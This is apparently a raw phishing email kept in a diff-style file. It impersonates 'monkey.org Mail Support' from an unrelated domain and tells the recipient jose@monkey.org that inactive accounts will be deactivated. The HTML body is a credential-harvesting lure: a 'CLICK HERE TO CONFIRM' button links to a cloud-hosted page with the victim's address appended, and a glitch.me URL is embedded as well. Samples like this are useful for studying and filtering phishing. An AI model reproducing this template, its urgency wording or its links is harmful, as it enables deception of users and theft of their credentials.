@@ -1,0 +1,148 @@
+Return-Path: update@pilnidia.in
+Delivered-To: jose@monkey.org
+X-FDA: 78204919422.33.F26E53C
+Received: from api.pilnidia.in (unknown [139.59.229.252])
+	by imf14.b.hostedemail.com (Postfix) with ESMTP id 36311101D6CED
+	for <jose@monkey.org>; Tue,  1 Jun 2021 11:23:31 +0000 (UTC)
+Received: from authenticated-user (api.pilnidia.in [139.59.229.252])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+	(No client certificate requested)
+	by api.pilnidia.in (Postfix) with ESMTPSA id CC6AC4A9C5
+	for <jose@monkey.org>; Tue,  1 Jun 2021 11:23:27 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=pilnidia.in; s=mail;
+	t=1622546608; bh=Ws7zkd4OjmhlnMaJuY4o32u1EWQ1o3cskDk6wyYD1u4=;
+	h=From:To:Subject:Date:From;
+	b=MA5mk1PmasZ2FMgiee/lA+NqMMbfZdEMOVbDOMcxWjeTu8v6oX4RJ2HwQ7T1Gkze0
+	 3i1BWxPSm8QLrvWtD/mQYslVFGOdcAoUVtsl8ozenuI3oSjDW6MmfLRGGbuy/7ywuJ
+	 8b/IleyfRNKJO0t1YWGaFtqwGawDZv86pjBGG2k9yhvvOepwEwZCg+5fnZN6ivIZ5Z
+	 22R3TZmg7SOJnUrLIBx4j8KekMDHe8fh5CnRQfGpo6w0jbABtf+hRX+xQ8n5T89VyY
+	 fs8m3FtEDG33gYKDxt+p7zGSOF2nmNv5AcRGKNNLPIQ1l1hLYO0Lma1nIdILwAKxD3
+	 dmzAX7V6YqqQQ==
+From: monkey.org Mail Support <update@pilnidia.in>
+To: jose@monkey.org
+Subject: Inactive users jose@monkey.org
+Date: 01 Jun 2021 11:23:27 +0000
+Message-ID: <20210601112326.769C23C6086E19AC@pilnidia.in>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Spam-Status: No, score=1.95
+Authentication-Results: imf14.b.hostedemail.com;	dkim=pass
+ header.d=pilnidia.in header.s=mail header.b=MA5mk1Pm;	spf=pass
+ (imf14.b.hostedemail.com: domain of update@pilnidia.in designates
+ 139.59.229.252 as permitted sender) smtp.mailfrom=update@pilnidia.in;
+	dmarc=pass (policy=quarantine) header.from=pilnidia.in
+X-Stat-Signature: 47r64mznetr4ucmhhj9w3ecaedxui3yg
+X-Rspamd-Queue-Id: 36311101D6CED
+X-Rspamd-Server: rspam01
+X-HE-Tag: 1622546611-740903
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 39
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.19963"></HEAD>
+<body>
+<DIV style=3D"FONT-SIZE: 12px; BORDER-TOP: 0px; FONT-FAMILY: Roboto,sans-se=
+rif; COLOR: rgb(51,51,51); TEXT-ALIGN: center; PADDING-TOP: 0px; border-rad=
+ius: 0px"><img style=3D"BORDER-TOP: 0px; HEIGHT: 134px; BORDER-RIGHT: 0px; =
+WIDTH: 153px; BORDER-BOTTOM: 0px; BORDER-LEFT: 0px; border-radius: 0px" bor=
+der=3D"0" hspace=3D"0" src=3D"https://logo.clearbit.com/monkey.org" width=
+=3D"251" align=3D"baseline" height=3D"249"></DIV>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; FONT-FAMILY: Roboto,sa=
+ns-serif; COLOR: rgb(51,51,51); MARGIN: 0in 0in 0pt; LINE-HEIGHT: normal; b=
+order-radius: 0px"><SPAN style=3D"BOX-SIZING: border-box; border-radius: 0p=
+x"><SPAN style=3D"FONT-SIZE: 13.5pt; FONT-FAMILY: Calibri,sans-serif; borde=
+r-radius: 0px"></SPAN></SPAN></P>
+<DIV style=3D"FONT-SIZE: 12px; FONT-FAMILY: Roboto,sans-serif; COLOR: rgb(5=
+1,51,51); TEXT-ALIGN: center; border-radius: 0px"><SPAN style=3D"FONT-SIZE:=
+ 13.5pt; border-radius: 0px"><STRONG style=3D"border-radius: 0px">USER ID:<=
+/STRONG>&nbsp;jose@monkey.org&nbsp;</SPAN></DIV><SPAN style=3D"FONT-SIZE: 1=
+3.5pt; FONT-FAMILY: Calibri,sans-serif; COLOR: rgb(51,51,51); border-radius=
+: 0px">
+<DIV style=3D"BORDER-TOP: 0px; TEXT-ALIGN: center; PADDING-TOP: 0px; border=
+-radius: 0px"><SPAN style=3D"FONT-SIZE: 13.5pt; border-radius: 0px">&nbsp;&=
+nbsp;</SPAN></DIV></SPAN><FONT style=3D"FONT-SIZE: 13.5pt; FONT-FAMILY: Cal=
+ibri,sans-serif; border-radius: 0px" color=3D#2c363a>
+<DIV style=3D"BORDER-TOP: 0px; TEXT-ALIGN: center; PADDING-TOP: 0px; border=
+-radius: 0px"><SPAN style=3D"FONT-SIZE: 13.5pt; border-radius: 0px">Inactiv=
+e users on monkey.org domain portal will be deactivated.</SPAN></DIV>
+<DIV style=3D"TEXT-ALIGN: center; border-radius: 0px"><SPAN style=3D"BOX-SI=
+ZING: border-box; FONT-SIZE: small; FONT-FAMILY: Arial,Helvetica,sans-serif=
+; COLOR: rgb(34,34,34); border-radius: 0px"><FONT style=3D"FONT-SIZE: 13.5p=
+t; FONT-FAMILY: Calibri,sans-serif; border-radius: 0px" color=3D#2c363a>To =
+continue using your account, Please&nbsp;</FONT></SPAN><SPAN style=3D"BOX-S=
+IZING: border-box; FONT-SIZE: 13.5pt; border-radius: 0px">confirm your&nbsp=
+;Identity and update</SPAN></DIV>
+<DIV style=3D"TEXT-ALIGN: center; border-radius: 0px"><SPAN style=3D"BOX-SI=
+ZING: border-box; FONT-SIZE: 13.5pt; border-radius: 0px">your email setting=
+s below.</SPAN></DIV></FONT><SPAN style=3D"FONT-SIZE: 12px; FONT-FAMILY: Ro=
+boto,sans-serif; COLOR: rgb(51,51,51)"></SPAN>
+<P style=3D"FONT-SIZE: 12px; FONT-FAMILY: Roboto,sans-serif; COLOR: rgb(51,=
+51,51); border-radius: 0px"></P>
+<P style=3D"FONT-SIZE: 12px; FONT-FAMILY: Roboto,sans-serif; COLOR: rgb(51,=
+51,51); border-radius: 0px"></P>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; FONT-FAMILY: Calibri,s=
+ans-serif; COLOR: rgb(44,54,58); TEXT-ALIGN: center; MARGIN: 0in 0in 0pt; L=
+INE-HEIGHT: normal; border-radius: 0px"><SPAN style=3D"VERTICAL-ALIGN: sub;=
+ border-radius: 0px"><SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 13.5=
+pt; border-radius: 0px"><BR style=3D"border-radius: 0px"></SPAN></SPAN></P>=
+
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; FONT-FAMILY: Roboto,sa=
+ns-serif; COLOR: rgb(44,54,58); MARGIN: 0in 0in 0pt; LINE-HEIGHT: normal; b=
+order-radius: 0px"><SPAN style=3D"BOX-SIZING: border-box; VERTICAL-ALIGN: s=
+ub; border-radius: 0px"></SPAN></P>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; FONT-FAMILY: Calibri,s=
+ans-serif; COLOR: rgb(44,54,58); MARGIN: 0in 0in 0pt; LINE-HEIGHT: 16px; bo=
+rder-radius: 0px"><SPAN style=3D"VERTICAL-ALIGN: sub; border-radius: 0px"><=
+SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 13.5pt; LINE-HEIGHT: 20px;=
+ border-radius: 0px"></SPAN><SPAN style=3D"BOX-SIZING: border-box; FONT-SIZ=
+E: 13.5pt; LINE-HEIGHT: 20px; border-radius: 0px"></SPAN></SPAN></P>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; FONT-FAMILY: Calibri,s=
+ans-serif; COLOR: rgb(51,51,51); TEXT-ALIGN: center; MARGIN: 0in 0in 0pt; L=
+INE-HEIGHT: 16px; border-radius: 0px"><SPAN style=3D"VERTICAL-ALIGN: sub; b=
+order-radius: 0px"><SPAN style=3D"BOX-SIZING: border-box; FONT-WEIGHT: bold=
+er; border-radius: 0px"><SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 1=
+3.5pt; LINE-HEIGHT: 20px; border-radius: 0px">
+<SPAN style=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(25,118,210) 6pt soli=
+d; BORDER-RIGHT: rgb(25,118,210) 6pt solid; BACKGROUND: rgb(25,118,210); BO=
+RDER-BOTTOM: rgb(25,118,210) 6pt solid; PADDING-BOTTOM: 0in; PADDING-TOP: 0=
+in; PADDING-LEFT: 0in; BORDER-LEFT: rgb(25,118,210) 6pt solid; PADDING-RIGH=
+T: 0in; border-radius: 0px">
+<A style=3D"COLOR: rgb(0,105,166); OUTLINE-WIDTH: medium; OUTLINE-STYLE: no=
+ne; OUTLINE-COLOR: invert; border-radius: 0px" href=3D"https://update365.s3=
+=2Eeu-de.cloud-object-storage.appdomain.cloud/adomain.html#jose@monkey.org"=
+ rel=3Dnoreferrer target=3D_blank data-saferedirecturl=3D"https://www.googl=
+e.com/url?q=3Dhttps://trail-earthy-wasabi.glitch.me/hob.html%23fomohus@invi=
+tel.hu&amp;source=3Dgmail&amp;ust=3D1622606241326000&amp;usg=3DAFQjCNEBn5Sv=
+OSTJ5Eoc78dZ6DpoSbi_NA"><FONT style=3D"border-radius: 0px" color=3D#ffffff>=
+
+CLICK HERE TO CONFIRM</FONT></A><FONT style=3D"border-radius: 0px" color=3D=
+#ffffff>&nbsp;</FONT></SPAN><BR style=3D"border-radius: 0px"></SPAN></SPAN>=
+</SPAN></P>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 11pt; FONT-FAMILY: Calibri,s=
+ans-serif; COLOR: rgb(44,54,58); TEXT-ALIGN: center; MARGIN: 0in 0in 0pt; L=
+INE-HEIGHT: 16px; border-radius: 0px"><SPAN style=3D"VERTICAL-ALIGN: sub; b=
+order-radius: 0px"><SPAN style=3D"BOX-SIZING: border-box; FONT-WEIGHT: bold=
+er; border-radius: 0px"><SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 1=
+3.5pt; COLOR: white; LINE-HEIGHT: 20px; border-radius: 0px"><BR style=3D"bo=
+rder-radius: 0px"></SPAN></SPAN></SPAN></P>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; FONT-FAMILY: Roboto,sa=
+ns-serif; COLOR: rgb(51,51,51); MARGIN: 0in 0in 0pt; LINE-HEIGHT: 16px; bor=
+der-radius: 0px"></P>
+<DIV style=3D"FONT-SIZE: 12px; FONT-FAMILY: Roboto,sans-serif; COLOR: rgb(5=
+1,51,51); TEXT-ALIGN: center; border-radius: 0px"><SPAN style=3D"FONT-FAMIL=
+Y: Calibri,sans-serif; COLOR: rgb(44,54,58); border-radius: 0px"><BR style=
+=3D"border-radius: 0px"></SPAN></DIV><SPAN style=3D"FONT-SIZE: 11pt; FONT-F=
+AMILY: Calibri,sans-serif; VERTICAL-ALIGN: sub; COLOR: rgb(44,54,58); borde=
+r-radius: 0px">
+<DIV style=3D"BORDER-TOP: 0px; TEXT-ALIGN: center; PADDING-TOP: 0px; border=
+-radius: 0px"><SPAN style=3D"FONT-SIZE: small; border-radius: 0px"><FONT st=
+yle=3D"border-radius: 0px" size=3D3>monkey.org IT Support Team</FONT></SPAN=
+></DIV></SPAN><SPAN style=3D"FONT-SIZE: 12px; FONT-FAMILY: Calibri,sans-ser=
+if; VERTICAL-ALIGN: sub; COLOR: rgb(44,54,58); border-radius: 0px">
+<DIV style=3D"BORDER-TOP: 0px; TEXT-ALIGN: center; PADDING-TOP: 0px; border=
+-radius: 0px">2021. All rights reserved</DIV></SPAN></BODY></HTML>
+
